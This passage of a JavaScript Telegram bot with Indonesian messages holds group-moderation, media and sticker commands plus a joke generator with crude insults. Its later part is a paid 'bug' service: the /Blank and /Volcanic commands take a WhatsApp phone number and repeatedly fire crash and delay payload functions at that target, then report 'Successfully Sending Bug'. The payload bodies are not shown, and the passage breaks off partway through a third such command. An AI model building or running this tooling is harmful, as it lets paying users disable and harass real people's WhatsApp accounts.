    await bot.editMessageText(`✅ Grup berhasil dibuka!\n[${generateProgressBar(100)}]`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  } catch (err) {
    clearInterval(intervalId);
    console.error("SET PERMISSIONS ERROR:", err);

    await bot.editMessageText("❌ Gagal membuka grup. Pastikan bot memiliki izin admin yang lengkap.", {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  }
});

// ================= COMMAND: CLOSE =================
command(/^\/Close$/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // Cek Owner
  const isOwner = config.OWNER_ID.map(Number).includes(fromId);
  if (!isOwner) {
    await bot.sendMessage(chatId, "❌ Hanya Owner yang bisa menggunakan command ini!");
    console.log(`User ${fromId} mencoba menggunakan /Close tapi bukan Owner.`);
    return; // Hentikan eksekusi
  }

  // Cek private chat
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di grup.");
  }

  // Cek Premium User
  if (!isPremiumUser(fromId)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk *Premium User*!", { parse_mode: "Markdown" });
  }

  // Cek Bot Admin
  if (!(await isBotAdmin(chatId))) {
    return bot.sendMessage(chatId, "❌ Bot harus menjadi admin untuk menutup grup!");
  }

  // Proses menutup grup dengan progress bar
  let percent = 0;
  const processingMsg = await bot.sendMessage(chatId, `⏳ Menutup grup\n[${generateProgressBar(percent)}]`);
  const intervalId = setInterval(() => {
    percent += 5;
    if (percent > 100) percent = 100;

    bot.editMessageText(`⏳ Menutup grup\n[${generateProgressBar(percent)}]`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    }).catch(() => {});

    if (percent >= 100) clearInterval(intervalId);
  }, 500);

  try {
    await bot.setChatPermissions(chatId, {
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_polls: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false,
      can_invite_users: false,
      can_pin_messages: false,
      can_change_info: false
    });

    clearInterval(intervalId);

    await bot.editMessageText(`🚫 Grup berhasil ditutup!\n[${generateProgressBar(100)}]`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  } catch (err) {
    clearInterval(intervalId);
    console.error("SET PERMISSIONS ERROR:", err);

    await bot.editMessageText("❌ Gagal menutup grup. Pastikan bot memiliki izin admin yang lengkap.", {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  }
});
// ================= COMMAND: CEKHODAM =================
command(/^\/cekkhodam(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();

  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Hanya premium yang bisa cek ID!");

  if (!nama) {
    return bot.sendMessage(chatId, 'Example /cekkhodam <nama>');
  }

  const khodamList = [
    'Capung Lonte',
    'Sahroni',
    'Salak Sepet',
    'kang hapus sumber',
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong'
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  // Escape semua teks untuk MarkdownV2
  const hasil = `\`\`\`
ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:
╭───────────────────────
├ •ɴᴀᴍᴀ : ${escapeMarkdown(nama)}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${escapeMarkdown(pickRandom(khodamList))}
├ •ɴɢᴇʀɪ ʏᴀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰────────────────────────
ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.
\`\`\``;

  bot.sendMessage(chatId, hasil, { parse_mode: 'MarkdownV2' });
});

// ================= COMMAND: QUOTE =================
const quotes = ["💪 Jangan menyerah, setiap hari adalah kesempatan baru!","🌟 Kesuksesan dimulai dari langkah kecil.","🔥 Fokus pada apa yang bisa kamu kontrol.","✨ Kebahagiaan dimulai dari diri sendiri.","⚡ Terus belajar, terus berkembang!"];
command(/^\/Quote$/, (msg) => {
  if (!isPremiumUser(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Hanya premium yang bisa dapat Quote!");
  const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
  bot.sendMessage(msg.chat.id, randomQuote);
});

// Menyimpan status antilink per chat
const antilinkStatus = {};

// Fungsi cek link
function containsLink(text) {
  const linkRegex = /(https?:\/\/[^\s]+)/gi;
  return linkRegex.test(text);
}

bot.onText(/\/antilink (on|off)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const action = match[1].toLowerCase();

  // Hanya owner
  if (!config.OWNER_ID.map(Number).includes(fromId)) {
    return bot.sendMessage(chatId, '❌ Hanya owner yang bisa mengubah pengaturan antilink!');
  }

  // Progress bar
  await showProgress(chatId, 5, 400);

  // Set status
  antilinkStatus[chatId] = action === 'on';

  // Konfirmasi
  await bot.sendMessage(
    chatId, ` \`\`\`
    🍭 Antilink telah ${escapeMarkdownV2(action.toUpperCase())}\`\`\``,
    { parse_mode: "MarkdownV2" }
  );

});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const text = msg.text;

  if (!text || !antilinkStatus[chatId]) return;

  if (containsLink(text)) {
    try {
      await bot.deleteMessage(chatId, messageId);
      console.log(`Pesan dari ${msg.from.username || msg.from.first_name} dihapus karena mengandung link.`);
    } catch (error) {
      console.error('Gagal menghapus pesan:', error.response?.description || error.message);
    }
  }
});

// ================= COMMAND: IQC =================
command(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  if (!isPremiumUser(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Premium Only!");

  const text = match?.[1];
  if (!text) 
    return bot.sendMessage(msg.chat.id, "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`", { parse_mode: "Markdown" });

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(msg.chat.id, "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`", { parse_mode: "Markdown" });
  }

  let processingMsg = await bot.sendMessage(msg.chat.id, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await axios.get(url, { responseType: "arraybuffer" });
    await bot.sendPhoto(msg.chat.id, Buffer.from(res.data), { caption: "Created By @LolipopXR" });
  } catch (e) {
    await bot.sendMessage(msg.chat.id, "❌ Gagal mengambil data dari API.");
    console.error("IQC ERROR:", e.message);
  }
});

// Command /hidetag
bot.onText(/\/hidetag(?: (.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const chatType = msg.chat.type; // private, group, supergroup
    const userText = match[1];
    
    if (!config.OWNER_ID.map(Number).includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Hanya Owner yang bisa mengatur cooldown!");
    }

    if (chatType === 'private') {
        return bot.sendMessage(chatId, '❌ Perintah /hidetag hanya bisa digunakan di *group*, bukan chat pribadi.', { parse_mode: 'Markdown' });
    }

    if (!userText) {
        return bot.sendMessage(chatId, '❌ Silakan tulis teks setelah command /hidetag, misal: `/hidetag Halo semuanya!`', { parse_mode: 'Markdown' });
    }

    try {
        const botMember = await bot.getChatMember(chatId, (await bot.getMe()).id);
        if (botMember.status !== 'administrator') {
            return bot.sendMessage(chatId, '❌ Bot harus menjadi *admin* di group untuk menggunakan /hidetag!', { parse_mode: 'Markdown' });
        }

        const chatMembers = await bot.getChatAdministrators(chatId);
        const mentions = chatMembers.map(member => `[​](tg://user?id=${member.user.id})`).join(' '); 

        await bot.sendMessage(chatId, `${userText}\n${mentions}`, { parse_mode: 'Markdown' });

        console.log('Hidetag berhasil dikirim di group:', chatId);
    } catch (error) {
        console.error('Error hidetag:', error);
        bot.sendMessage(chatId, '❌ Gagal menggunakan hidetag.');
    }
});

// ================= COMMAND: TOURL =================
command(/^\/Tourl$/, async (msg) => {
  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(msg.chat.id, "❌ Premium Only!");
  if (!msg.reply_to_message) 
    return bot.sendMessage(msg.chat.id, "❌ Reply file/foto/video dengan /Tourl");

  const repliedMsg = msg.reply_to_message;
  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  } else {
    return bot.sendMessage(msg.chat.id, "❌ Format tidak didukung.");
  }

  const processingMsg = await bot.sendMessage(msg.chat.id, "⏳ Lagi Di Siapin Sama @LolipopXR...");
  try {
    // Ambil file path dari Telegram
    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;

    // Ambil file dari Telegram
    const response = await axios.get(fileLink, { responseType: "stream" });

    // Upload ke Catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", response.data, {
      filename: fileName,
      contentType: response.headers["content-type"],
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    await bot.editMessageText(
      `✅ Created By @Rappzmodzz\n📎 URL: ${catboxUrl}`,
      { chat_id: msg.chat.id, message_id: processingMsg.message_id }
    );
  } catch (e) {
    console.error("TOURL ERROR:", e.message || e);
    bot.editMessageText("❌ Gagal mengupload file ke Catbox", {
      chat_id: msg.chat.id,
      message_id: processingMsg.message_id,
    });
  }
});

// ================= COMMAND: BRAT =================
async function showProgress(chatId, messageId, steps = 5, delay = 500) {
  for (let i = 1; i <= steps; i++) {
    const bar = '▓'.repeat(i) + '░'.repeat(steps - i);
    try {
      await bot.editMessageText(`⌛ Create Sticker...\n[${bar}]`, {
        chat_id: chatId,
        message_id: messageId
      });
    } catch (err) {
      console.error("Gagal edit progress:", err.response?.body?.description || err.message);
      break; // hentikan loop kalau error
    }
    await new Promise(r => setTimeout(r, delay));
  }

  // pesan akhir
  try {
    await bot.editMessageText(`✅ Sticker berhasil dibuat!\n[${'▓'.repeat(steps)}]`, {
      chat_id: chatId,
      message_id: messageId
    });
  } catch (err) {
    console.error("Gagal edit pesan akhir:", err.response?.body?.description || err.message);
  }
}

command(/^\/Brat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Premium Only!");
  
  const progressMessage = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

  // Update progress bar
  await showProgress(chatId, progressMessage.message_id, 5, 400);

  try {
    const text = match[1];
    const canvas = createCanvas(512, 512);
    const ctx = canvas.getContext("2d");

    // Background pink
    ctx.fillStyle = "#ff69b4"; 
    ctx.fillRect(0, 0, 512, 512);

    // Lollipop generator
    function drawLollipop(x, y, size) {
      ctx.fillStyle = "#fff";
      ctx.fillRect(x - size/10, y, size/5, size*0.8);

      const gradient = ctx.createRadialGradient(x, y, size*0.2, x, y, size/2);
      gradient.addColorStop(0, "#ffb6c1");
      gradient.addColorStop(0.5, "#ff69b4");
      gradient.addColorStop(1, "#ff1493");

      ctx.beginPath();
      ctx.arc(x, y, size/2, 0, Math.PI*2);
      ctx.fillStyle = gradient;
      ctx.fill();
    }

    // Random lollipops
    for (let i = 0; i < 15; i++) {
      const x = Math.random() * 512;
      const y = Math.random() * 512;
      const size = 30 + Math.random() * 40;
      drawLollipop(x, y, size);
    }

    // Text
    ctx.fillStyle = "#ffffff";
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.font = "bold 60px Arial";
    ctx.shadowColor = "#000000";
    ctx.shadowBlur = 8;
    ctx.shadowOffsetX = 2;
    ctx.shadowOffsetY = 2;
    ctx.fillText(text, 256, 256);

    // Send sticker
    const buffer = canvas.toBuffer("image/png");
    await bot.sendSticker(chatId, buffer);

    // Update progress → selesai
    await bot.editMessageText("✅ Stiker berhasil dibuat!", {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });

  } catch (e) {
    console.error("BRAT ERROR:", e);

    await bot.editMessageText("❌ Gagal membuat stiker.", {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
});

// ================= COMMAND: MEDIAFIRE =================
command(/\/mediafire(?:\s+(.+))?/, async (msg, match) => {
  if (!isPremiumUser(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Premium Only!");

  const urlInput = match[1] ? match[1].trim() : null;
  if (!urlInput) return bot.sendMessage(msg.chat.id, "⚠ Gunakan contoh:\n/mediafire <url>");

  try {
    const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(urlInput)}`);
    if (!data || !data.data) return bot.sendMessage(msg.chat.id, "❌ Gagal mendapatkan data dari MediaFire.");

    const { title, url } = data.data;
    const filePath = path.join(__dirname, "tmp_" + title);
    const response = await axios.get(url, { responseType: "arraybuffer" });
    fs.writeFileSync(filePath, response.data);

    const zip = new AdmZip();
    zip.addLocalFile(filePath);
    const zipPath = filePath + ".zip";
    zip.writeZip(zipPath);

    await bot.sendDocument(msg.chat.id, zipPath, { caption: "📦 File berhasil di-zip dari MediaFire" });

    fs.unlinkSync(filePath);
    fs.unlinkSync(zipPath);
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(msg.chat.id, "❌ Terjadi kesalahan: " + err.message);
  }
});

// ================= COMMAND: TIKTOK =================
command(/\/Tiktok(?:\s+(.+))?/, async (msg, match) => {
  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(msg.chat.id, "❌ Premium Only!");

  const chatId = msg.chat.id;
  const keyword = match[1] ? match[1].trim() : null;
  if (!keyword) 
    return bot.sendMessage(chatId, "❌ Masukkan kata kunci.\nContoh: /Tiktok sad");

  // Pesan loading
  const processingMsg = await bot.sendMessage(chatId, "⏳ Proses....");
  let dots = 0;
  const intervalId = setInterval(() => {
    dots = (dots + 1) % 4;
    bot.editMessageText("⏳ Sedang mencari Video TikTok" + ".".repeat(dots), { 
      chat_id: chatId, 
      message_id: processingMsg.message_id 
    }).catch(()=>{});
  }, 500);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/s/tiktok", 
      { query: keyword }, 
      { 
        headers: { "Content-Type": "application/json" },
        timeout: 10000 // biar ga nunggu terlalu lama
      }
    );

    clearInterval(intervalId);

    const data = response.data;
    if (!data.status || !data.data || data.data.length === 0) {
      return bot.editMessageText("⚠ Tidak ditemukan video TikTok.", { 
        chat_id: chatId, 
        message_id: processingMsg.message_id 
      });
    }

    let replyText = `🔎 Hasil pencarian TikTok untuk: <b>${keyword}</b>\n\n`;
    data.data.slice(0, 3).forEach(video => {
      replyText += `🎬 <b>${video.title.trim()}</b>\n👤 ${video.author.nickname} (@${video.author.unique_id})\n▶️ <a href="${video.play}">Link Video</a>\n🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n⬇️ <a href="${video.wmplay}">Download WM</a>\n\n`;
    });

    bot.editMessageText(replyText, { 
      chat_id: chatId, 
      message_id: processingMsg.message_id, 
      parse_mode: "HTML", 
      disable_web_page_preview: true 
    });
  } catch (e) {
    clearInterval(intervalId);
    console.error("TIKTOK ERROR:", e.message || e);
    bot.editMessageText("❌ Terjadi kesalahan saat mengambil data TikTok.", { 
      chat_id: chatId, 
      message_id: processingMsg.message_id 
    });
  }
});
/// --- ( Case Bug ) --- \\
const crashRequestMap = new Map();

bot.onText(/\/Blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // cek akses premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "🍭 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Kirim pesan awal
  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>NatzuBeta</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Blank
𖥂 Status : Select The Mode!
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>© Developer @Rappzmodzz</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "BLANK SLOW", callback_data: `Blank:medium:${formattedNumber}` },
          { text: "BLANK HARD", callback_data: `Blank:hard:${formattedNumber}` }
        ],
        [
          { text: "BLANK EASY", callback_data: `Blank:easy:${formattedNumber}` },
          { text: "CLOSE", callback_data: `Blank:cancel:${formattedNumber}` }
        ]
      ]
    }
  });

  // simpan request berdasarkan message_id
  crashRequestMap.set(sent.message_id, {
    requester: userId,
    target: formattedNumber
  });
});


bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const fromId = callbackQuery.from.id;
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  const runtime = getBotRuntime();
  const date = getCurrentDate();

  if (!data?.startsWith("Blank:")) return bot.answerCallbackQuery(callbackQuery.id);

  const [, action, formattedNumber] = data.split(":");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // cek requester
  const req = crashRequestMap.get(messageId);
  if (!req || req.requester !== fromId) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses Di Tolak..! By Natzu.",
      show_alert: true
    });
    return; // stop di sini
  }

  // cek premium
  if (!premiumUsers.some(u => u.id === fromId && new Date(u.expiresAt) > new Date())) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses ditolak.",
      show_alert: true
    });
    return;
  }

  // tombol cancel
  if (action === "cancel") {
    await bot.editMessageCaption(
      `
<blockquote>NatzuVloods</blockquote>
⚪️ Proses The Mode Close
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
    crashRequestMap.delete(messageId);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Proses dibatalkan. Kembali ke menu utama."
    });
    return;
  }

  // edit caption status mulai
  await bot.editMessageCaption(
    `
<blockquote>Developer @Rappzmodzz</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Blank
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : 📍Sedang mengirim...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
    { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
  );

  await bot.answerCallbackQuery(callbackQuery.id, { text: `Menjalankan Blank (${action})...` });

  try {
    if (action === "easy") {
      for (let i = 0; i < 20; i++) {
        await CtaZts(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await CtaZts(sock, target);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "medium") {
      for (let i = 0; i < 30; i++) {
        await XNecroBlankV4(target);
        await new Promise(r => setTimeout(r, 500));
        await XNecroBlankV3(target);
        await new Promise(r => setTimeout(r, 500));
        await XNecroBlankV4(target);
        await new Promise(r => setTimeout(r, 500));
        await XNecroBlankV5(target);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "hard") {
      for (let i = 0; i < 20; i++) {
        await Aqua(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await Aqua(sock, target);
        await new Promise(r => setTimeout(r, 500));
      }
    }

    await bot.editMessageCaption(
      `
<blockquote>The Natzu</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Blank
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
  } catch (errLoop) {
    console.error(errLoop);
    await bot.editMessageCaption(`❌ Terjadi error saat proses: ${errLoop.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  } finally {
    crashRequestMap.delete(messageId);
  }
});

bot.onText(/\/Volcanic (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  // cek akses premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "#-𝖫𝗈𝗅𝗂𝗉𝗈𝗉", url: "https://t.me/Excation99" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "🍭 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  // Kirim pesan awal
  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>The Natzu</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Blank
𖥂 Status : Select The Mode!
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "DELAY MEDIUM", callback_data: `Volcanic:medium:${formattedNumber}` },
          { text: "DELAY HARD", callback_data: `Volcanic:hard:${formattedNumber}` }
        ],
        [
          { text: "DELAY EASY", callback_data: `Volcanic:easy:${formattedNumber}` },
          { text: "CLOSE", callback_data: `Volcanic:cancel:${formattedNumber}` }
        ]
      ]
    }
  });

  // simpan request berdasarkan message_id
  crashRequestMap.set(sent.message_id, {
    requester: userId,
    target: formattedNumber
  });
});


bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const fromId = callbackQuery.from.id;
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
  const runtime = getBotRuntime();
  const date = getCurrentDate();

  if (!data?.startsWith("Volcanic:")) return bot.answerCallbackQuery(callbackQuery.id);

  const [, action, formattedNumber] = data.split(":");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // cek requester
  const req = crashRequestMap.get(messageId);
  if (!req || req.requester !== fromId) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses Di Tolak..! By Natzu.",
      show_alert: true
    });
    return; // stop di sini
  }

  // cek premium
  if (!premiumUsers.some(u => u.id === fromId && new Date(u.expiresAt) > new Date())) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ Akses ditolak.",
      show_alert: true
    });
    return;
  }

  // tombol cancel
  if (action === "cancel") {
    await bot.editMessageCaption(
      `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
⚪️ Proses The Mode Cancel.
━━━━━━━━━━━━━━━━━━
<blockquote>𖥂 Created @LolipopXR</blockquote>
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
    crashRequestMap.delete(messageId);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Proses dibatalkan. Kembali ke menu utama."
    });
    return;
  }

  // edit caption status mulai
  await bot.editMessageCaption(
    `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Volcanic
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : 📍Sedang mengirim...
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
    { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
  );

  await bot.answerCallbackQuery(callbackQuery.id, { text: `Menjalankan Volcanic (${action})...` });

  try {
    if (action === "easy") {
      for (let i = 0; i < 10; i++) {
        await XProtexBlankXDelay(target);
        await new Promise(r => setTimeout(r, 500));
        await XProtexBlankXDelay(target);
        await new Promise(r => setTimeout(r, 500));
        await XProtexBlankXDelay(target);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "medium") {
      for (let i = 0; i < 20; i++) {
        await XNecroDelayX(target, mention = true);
        await new Promise(r => setTimeout(r, 500));
        await XNecroDelayX(target, mention = true);
        await new Promise(r => setTimeout(r, 500));
        await XNecroDelayX(target, mention = true);
        await new Promise(r => setTimeout(r, 500));
      }
    } else if (action === "hard") {
      for (let i = 0; i < 20; i++) {
        await handleSzt(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await XNecroDozerX(target, true);
        await new Promise(r => setTimeout(r, 500));
        await handleSzt(sock, target);
        await new Promise(r => setTimeout(r, 500));
        await XNecroDozerX(target, true);
        await new Promise(r => setTimeout(r, 500));
      }
    }

    await bot.editMessageCaption(
      `
<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Volcanic
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
  } catch (errLoop) {
    console.error(errLoop);
    await bot.editMessageCaption(`❌ Terjadi error saat proses: ${errLoop.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  } finally {
    crashRequestMap.delete(messageId);
  }
});

bot.onText(/\/Silenty (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
